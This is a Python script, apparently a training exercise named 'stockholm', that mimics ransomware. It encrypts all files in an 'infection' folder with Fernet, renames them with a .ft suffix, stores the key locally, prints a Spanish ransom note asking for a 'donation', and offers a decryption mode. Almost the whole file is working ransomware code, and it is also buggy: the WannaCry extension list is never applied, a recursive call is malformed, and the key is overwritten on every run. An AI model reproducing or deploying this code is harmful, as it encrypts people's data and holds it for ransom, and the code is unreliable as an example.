print('''
--------------------------------------------------------------------------------------------------------------
==============================================================================================================
				S T O C K H O L M                                        by jfrontel
==============================================================================================================
--------------------------------------------------------------------------------------------------------------
''')

from cryptography.fernet import Fernet
import argparse
import os

# __________________________________________  STOCKHOLM: INFO  _____________________________________________ #
'''El programa stockholm_infection_ransomware de cifrado capaz de cifrar y descifrar ficheros, actuará solo sobre los archivos 
con las extensiones que fueron afectadas por Wannacry. Solo sobre la carpeta infection en el directorio HOME del usuario.
	  : Sin argumentos el programa cifra todos los ficheros de la carpeta infection
 	-r: (Vacuna) revierte la infección usando la clave de cifrada, dada como argumento.
 	-v: (Versión) muestra la version del programa.
 	-s: (Silent) no muestra información por pantalla.
'''

# __________________________________________  VARIABLES GLOBALES _____________________________________________ #
# extensiones usadas por el ransomware de cifrado WannaCry

dir_path = './infection/'

version = "stockholm 2.4"

wannacry = ['.123', '.3dm', '.3ds', '.3g2', '.3gp', '.602', '.7z', '.ARC', '.PAQ', '.accdb', '.aes', '.ai', '.asc',
			'.asf', '.asm', '.asp', '.avi', '.backup', '.bak', '.bat', '.bmp', '.brd', '.bz2', '.c', '.cgm',
			'.class', '.cmd', '.cpp', '.crt', '.csr', '.cs', '.csv', '.db', '.dbf', '.dch', '.der', '.dif', '.dip',
			'.djvu', '.doc', '.docb', '.docm', '.docx', '.dot', '.dotm', '.dotx', '.dwg', '.edb', '.eml', '.fla', '.flv',
			'.frm', '.gif', '.gpg', '.gz', '.h', '.hwp', '.ibd', '.iso', '.jar', '.java', '.jpeg', '.jpg', '.js',
			'.jsp', '.key', '.lay', '.lay6', '.ldf', '.m3u', '.m4u', '.max', '.mdb', '.mdf', '.mid', '.mkv', '.mml',
			'.mov', '.mp3', '.mp4', '.mpeg', '.mpg', '.msg', '.myd', '.myi', '.nef', '.odb', '.odg', '.odp', '.ods',
			'.odt', '.onetoc2', '.ost', '.otg', '.otp', '.ots', '.ott', '.pas', '.pdf', '.pem', '.pfx', '.php', '.pl',
			'.p12', '.png', '.pot', '.potm', '.potx', '.ppam', '.pps', '.ppsm', '.ppsx', '.ppt', '.pptm', '.pptx',
			'.ps1', '.psd', '.pst', '.rar', '.raw', '.rb', '.rtf', '.sch', '.sh', '.sldm', '.sldx', '.slk', '.sln',
			'.snt', '.sql', '.sqlite3', '.sqlitedb', '.stc', '.std', '.sti', '.suo', '.svg', '.swf', '.sxc', '.sxd',
			'.sxi', '.sxm', '.sxw', '.tar', '.tbk', '.tgz', '.tif', '.tiff', '.txt', '.uop', '.uot', '.vb', '.vbs',
			'.vcd', '.vdi', '.vmdk', '.vmx', '.vob', '.vsd', '.vsdx', '.wav', '.wb2', '.wk1', '.wks', '.wma', '.wmv',
			'.xlc', '.xlm', '.xls', '.xlsb', '.xlsm', '.xlsx', '.xlt', '.xltm', '.xltx', '.xlw', '.zip']


# __________________________________________  MENÚ DE ARGUMENTOS  _____________________________________________ #
# ft_get_argument() tomará los argumentos de entrada del programa stockholm

def ft_get_argument():
	flag = argparse.ArgumentParser(description="Stockholm sin argumentos procedera al secuestro de archivos en la carpeta Infection.")
	flag.add_argument("-r", "--reverse", type=str, help="(Vacuna) - revierte infección usando la clave de cifrado.")
	flag.add_argument("-v", "--version", action="store_true", help="Versión")
	flag.add_argument("-s", "--silent", action="store_true", help="No muestra información por pantalla")
	print(flag.parse_args())
	return(flag.parse_args())


def ft_desencriptar_archivo(archivo_infectado, key_infection):
	print(key_infection)
	if archivo_infectado.endswith('.ft'):
		cyphr = Fernet(key_infection)
		print(cyphr)

		try:
			with open(archivo_infectado, 'rb') as text:
				enc_data = text.read()
			or_data = cyphr.decrypt(enc_data)
		except:
			print(f'No se pudo LEER el contenido de {archivo_infectado}')
		
		try:
			with open(archivo_infectado, 'wb') as or_file:
				or_file.write(or_data)
			os.rename(archivo_infectado, archivo_infectado[:len(archivo_infectado)-len('.ft')])
		except:
			print(f'No se pudo DESENCRIPTAR el contenido de {archivo_infectado}')


def ft_encriptar_archivo(archivo_infectado):
	key = open('my_ransom.key', 'rb').read()
	print(key)
	fernet_key = Fernet(key)
	print(fernet_key)
	try:
		with open(archivo_infectado, 'rb') as text:
			or_data = text.read()
		encrypt_data = fernet_key.encrypt(or_data)
	except:
		print(f'No se pudo encriptar el contenido de {archivo_infectado}')
	
	try:	
		with open(archivo_infectado, 'wb') as enc_file:
			enc_file.write(encrypt_data)
		if archivo_infectado.endswith('.ft') == False:
			os.rename(archivo_infectado, archivo_infectado + '.ft')
		else:
			print('Este archivo ya esta infectado')
	except:
		print('Segunda parte salio mal')



def ft_get_files():
	archivos_dir = os.listdir(dir_path)
	print(archivos_dir)
	for archivo_n in archivos_dir:
		print(archivo_n)
		archivo_infectado = dir_path + archivo_n
		if os.path.isdir(archivo_infectado):
			ft_get_files(archivo_infectado + '/')
		
		if args.reverse:
			ft_desencriptar_archivo(archivo_infectado, args.reverse)

		else:
			if not os.path.isdir(archivo_infectado): #Comprobar si la ruta especificada es un directorio existente o no
				print(archivo_infectado + " esta siendo infectado por Stockholm")
			ft_encriptar_archivo(archivo_infectado)



# __________________________________________________  MAIN  _______________________________________________________ #
'''
El método de Python listdir() devuelve una lista que contiene los nombres de las entradas en el directorio dado por path. 
La lista está en orden arbitrario. No incluye las entradas especiales '.' y '..' aunque estén presentes en el directorio.

El módulo os.path es un submódulo del módulo OS en Python utilizado para la manipulación común de nombres de rutas.
'''

args = ft_get_argument()

if __name__ == "__main__":

	print(args.reverse)
	key_infection = args.reverse
	if args.version == True:
		print(version)
	my_key = Fernet.generate_key()

	with open('my_ransom.key', 'wb') as key:
		key.write(my_key)
	ft_get_files()
	if args.reverse:
		print("[🌸️] Gracias por contratarnos, la donacion ha sido aceptada y sus archivos liberados.")
	else:
		print("\n", "[💀] "*12, "\n\n", dir_path + "\nSus datos han sido encriptados. \nLe podemos ayudar a resolver este problema. \nSiga las instrucciones para la donacion... ", "\n\n", "[💀] "*12, "\n")

